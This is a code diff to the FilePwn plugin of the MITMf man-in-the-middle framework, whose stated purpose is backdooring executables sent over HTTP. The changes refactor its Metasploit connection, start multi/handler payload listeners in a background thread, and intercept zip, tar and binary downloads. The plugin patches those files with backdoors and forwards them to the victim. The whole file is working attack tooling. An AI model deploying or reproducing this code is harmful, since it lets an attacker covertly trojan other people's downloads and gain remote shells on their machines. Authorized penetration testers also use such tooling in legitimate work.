@@ -61,25 +61,26 @@ import logging
 import shutil
 import random
 import string
+import threading
 import tarfile
 import multiprocessing
 
 from libs.bdfactory import pebin
 from libs.bdfactory import elfbin
 from libs.bdfactory import machobin
-from core.msfrpc import Msfrpc
+from core.msfrpc import Msf
+from core.utils import shutdown
 from plugins.plugin import Plugin
 from tempfile import mkstemp
 from configobj import ConfigObj
 
-mitmf_logger = logging.getLogger('mitmf')
+mitmf_logger = logging.getLogger("mitmf")
 
 class FilePwn(Plugin):
     name        = "FilePwn"
     optname     = "filepwn"
     desc        = "Backdoor executables being sent over http using bdfactory"
-    implements  = ["handleResponse"]
-    tree_output = ["BDFProxy v0.3.2 online"]
+    tree_info = ["BDFProxy v0.3.2 online"]
     version     = "0.3"
     has_opts    = False
 
@@ -110,21 +111,8 @@ class FilePwn(Plugin):
         #NOT USED NOW
         #self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
 
-        #Metasploit options
-        msfcfg  = options.configfile['MITMf']['Metasploit']
-        rpcip   = msfcfg['rpcip']
-        rpcpass = msfcfg['rpcpass']
-
-        try:
-            self.msf = Msfrpc({"host": rpcip})  #create an instance of msfrpc libarary
-            self.msf.login('msf', rpcpass)
-            version = self.msf.call('core.version')['version']
-            self.tree_output.append("Connected to Metasploit v%s" % version)
-        except Exception:
-            sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
-
         #FilePwn options
-        self.userConfig      = options.configfile['FilePwn']
+        self.userConfig      = self.config['FilePwn']
         self.FileSizeMax     = self.userConfig['targets']['ALL']['FileSizeMax']
         self.WindowsIntelx86 = self.userConfig['targets']['ALL']['WindowsIntelx86']
         self.WindowsIntelx64 = self.userConfig['targets']['ALL']['WindowsIntelx64']
@@ -138,31 +126,36 @@ class FilePwn(Plugin):
         self.zipblacklist    = self.userConfig['ZIP']['blacklist']
         self.tarblacklist    = self.userConfig['TAR']['blacklist']
 
-        self.tree_output.append("Setting up Metasploit payload handlers")
-        
-        jobs = self.msf.call('job.list')
+        msfversion = Msf().version()
+        self.tree_info.append("Connected to Metasploit v{}".format(msfversion))
+
+        t = threading.Thread(name='setupMSF', target=self.setupMSF)
+        t.setDaemon(True)
+        t.start()
+
+    def setupMSF(self):
+        msf = Msf()
         for config in [self.LinuxIntelx86, self.LinuxIntelx64, self.WindowsIntelx86, self.WindowsIntelx64, self.MachoIntelx86, self.MachoIntelx64]:
             cmd = "use exploit/multi/handler\n"
             cmd += "set payload {}\n".format(config["MSFPAYLOAD"])
             cmd += "set LHOST {}\n".format(config["HOST"])
             cmd += "set LPORT {}\n".format(config["PORT"])
+            cmd += "set ExitOnSession False\n"
             cmd += "exploit -j\n"
 
-            if jobs:
-                for pid, name in jobs.iteritems():
-                    info = self.msf.call('job.info', [pid])
-                    if (info['name'] != "Exploit: multi/handler") or (info['datastore']['payload'] != config["MSFPAYLOAD"]) or (info['datastore']['LPORT'] != config["PORT"]) or (info['datastore']['lhost'] != config['HOST']):
-                        #Create a virtual console
-                        c_id = self.msf.call('console.create')['id']
-
-                        #write the cmd to the newly created console
-                        self.msf.call('console.write', [c_id, cmd])
+            pid = msf.findpid('multi/handler')
+            if pid:
+                info = msf.jobinfo(pid)
+                if (info['datastore']['payload'] == config["MSFPAYLOAD"]) and (info['datastore']['LPORT'] == config["PORT"]) and (info['datastore']['lhost'] != config['HOST']):
+                    msf.killjob(pid)
+                    msf.sendcommand(cmd)
+                else:
+                    msf.sendcommand(cmd)
             else:
-                #Create a virtual console
-                c_id = self.msf.call('console.create')['id']
+                msf.sendcommand(cmd)
 
-                #write the cmd to the newly created console
-                self.msf.call('console.write', [c_id, cmd])
+    def onConfigChange(self):
+        self.initialize(self.options)
 
     def convert_to_Bool(self, aString):
         if aString.lower() == 'true':
@@ -351,7 +344,7 @@ class FilePwn(Plugin):
 
         if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
             print "[!] TarFile over allowed size"
-            mitmf_logger.info("TarFIle maxSize met %s", len(aTarFileBytes))
+            mitmf_logger.info("TarFIle maxSize met {}".format(len(aTarFileBytes)))
             self.patched.put(aTarFileBytes)
             return
 
@@ -423,7 +416,7 @@ class FilePwn(Plugin):
 
                 if keywordCheck is True:
                     print "[!] Tar blacklist enforced!"
-                    mitmf_logger.info('Tar blacklist enforced on %s', info.name)
+                    mitmf_logger.info('Tar blacklist enforced on {}'.format(info.name))
                     continue
 
                 # Try to patch
@@ -444,14 +437,14 @@ class FilePwn(Plugin):
                             info.size = os.stat(file2).st_size
                             with open(file2, 'rb') as f:
                                 newTarFile.addfile(info, f)
-                            mitmf_logger.info("%s in tar patched, adding to tarfile", info.name)
+                            mitmf_logger.info("{} in tar patched, adding to tarfile".format(info.name))
                             os.remove(file2)
                             wasPatched = True
                         else:
                             print "[!] Patching failed"
                             with open(tmp.name, 'rb') as f:
                                 newTarFile.addfile(info, f)
-                            mitmf_logger.info("%s patching failed. Keeping original file in tar.", info.name)
+                            mitmf_logger.info("{} patching failed. Keeping original file in tar.".format(info.name))
                 if patchCount == int(self.userConfig['TAR']['patchCount']):
                     mitmf_logger.info("Met Tar config patchCount limit.")
 
@@ -479,7 +472,7 @@ class FilePwn(Plugin):
 
         if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
             print "[!] ZipFile over allowed size"
-            mitmf_logger.info("ZipFIle maxSize met %s", len(aZipFile))
+            mitmf_logger.info("ZipFIle maxSize met {}".format(len(aZipFile)))
             self.patched.put(aZipFile)
             return
 
@@ -536,7 +529,7 @@ class FilePwn(Plugin):
 
             if keywordCheck is True:
                 print "[!] Zip blacklist enforced!"
-                mitmf_logger.info('Zip blacklist enforced on %s', info.filename)
+                mitmf_logger.info('Zip blacklist enforced on {}'.format(info.filename))
                 continue
 
             patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)
@@ -546,12 +539,12 @@ class FilePwn(Plugin):
                 file2 = "backdoored/" + os.path.basename(info.filename)
                 print "[*] Patching complete, adding to zip file."
                 shutil.copyfile(file2, tmpDir + '/' + info.filename)
-                mitmf_logger.info("%s in zip patched, adding to zipfile", info.filename)
+                mitmf_logger.info("{} in zip patched, adding to zipfile".format(info.filename))
                 os.remove(file2)
                 wasPatched = True
             else:
                 print "[!] Patching failed"
-                mitmf_logger.info("%s patching failed. Keeping original file in zip.", info.filename)
+                mitmf_logger.info("{} patching failed. Keeping original file in zip.".format(info.filename))
 
             print '-' * 10
 
@@ -587,46 +580,46 @@ class FilePwn(Plugin):
             self.patched.put(tempZipFile)
             return
 
-    def handleResponse(self, request, data):
+    def serverResponse(self, response, request, data):
 
-        content_header = request.client.headers['Content-Type']
-        client_ip = request.client.getClientIP()
+        content_header = response.headers['Content-Type']
+        client_ip      = response.getClientIP()
 
         if content_header in self.zipMimeTypes:
             
             if self.bytes_have_format(data, 'zip'):
-                mitmf_logger.info("%s Detected supported zip file type!" % client_ip)
+                mitmf_logger.info("[FilePwn] {} Detected supported zip file type!".format(client_ip))
                 
                 process = multiprocessing.Process(name='zip', target=self.zip, args=(data,))
                 process.daemon = True
                 process.start()
-                process.join()
+                #process.join()
                 bd_zip = self.patched.get()
 
                 if bd_zip:
-                    mitmf_logger.info("%s Patching complete, forwarding to client" % client_ip)
-                    return {'request': request, 'data': bd_zip}
+                    mitmf_logger.info("[FilePwn] {} Patching complete, forwarding to client".format(client_ip))
+                    return {'response': response, 'request': request, 'data': bd_zip}
 
             else:
                 for tartype in ['gz','bz','tar']:
                     if self.bytes_have_format(data, tartype):
-                        mitmf_logger.info("%s Detected supported tar file type!" % client_ip)
+                        mitmf_logger.info("[FilePwn] {} Detected supported tar file type!".format(client_ip))
                         
                         process = multiprocessing.Process(name='tar_files', target=self.tar_files, args=(data,))
                         process.daemon = True
                         process.start()
-                        process.join()
+                        #process.join()
                         bd_tar = self.patched.get()
 
                         if bd_tar:
-                            mitmf_logger.info("%s Patching complete, forwarding to client" % client_ip)
-                            return {'request': request, 'data': bd_tar}
+                            mitmf_logger.info("[FilePwn] {} Patching complete, forwarding to client".format(client_ip))
+                            return {'response': response, 'request': request, 'data': bd_tar}
 
         
         elif content_header in self.binaryMimeTypes:
             for bintype in ['pe','elf','fatfile','machox64','machox86']:
                 if self.bytes_have_format(data, bintype):
-                    mitmf_logger.info("%s Detected supported binary type!" % client_ip)
+                    mitmf_logger.info("[FilePwn] {} Detected supported binary type ({})!".format(client_ip, bintype))
                     fd, tmpFile = mkstemp()
                     with open(tmpFile, 'w') as f:
                         f.write(data)
@@ -634,15 +627,14 @@ class FilePwn(Plugin):
                     process = multiprocessing.Process(name='binaryGrinder', target=self.binaryGrinder, args=(tmpFile,))
                     process.daemon = True
                     process.start()
-                    process.join()
+                    #process.join()
                     patchb = self.patched.get()
 
                     if patchb:
                         bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                         os.remove('./backdoored/' + os.path.basename(tmpFile))
-                        mitmf_logger.info("%s Patching complete, forwarding to client" % client_ip)
-                        return {'request': request, 'data': bd_binary}
+                        mitmf_logger.info("[FilePwn] {} Patching complete, forwarding to client".format(client_ip))
+                        return {'response': response, 'request': request, 'data': bd_binary}
 
-        else:
-            mitmf_logger.debug("%s File is not of supported Content-Type: %s" % (client_ip, content_header))
-            return {'request': request, 'data': data}
+        mitmf_logger.debug("[FilePwn] {} File is not of supported Content-Type: {}".format(client_ip, content_header))
+        return {'response': response, 'request': request, 'data': data}
